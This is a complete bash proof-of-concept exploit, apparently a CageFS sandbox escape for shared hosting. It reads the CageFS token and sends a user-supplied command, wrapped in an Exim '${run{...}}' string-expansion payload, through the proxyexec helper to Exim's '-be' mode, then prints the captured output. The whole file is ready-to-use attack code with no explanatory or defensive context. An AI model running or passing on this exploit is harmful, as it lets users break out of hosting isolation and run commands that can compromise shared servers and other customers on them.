#!/bin/bash

if [[ $# -eq 0 ]]
then
    echo "Usage: $0 <command> [arg]..."
    exit 1
fi

OUTPUT_FILE=$(mktemp -p "${HOME}")

echo "\${run{/bin/bash -c \"$@ >${OUTPUT_FILE}\"}{foo}{bar}}" | /usr/sbin/proxyexec -c cagefs.sock "$USER" "$(cat /var/.cagefs/.cagefs.token)" "$(pwd)" EXIM -be
cat "${OUTPUT_FILE}"
rm "${OUTPUT_FILE}"
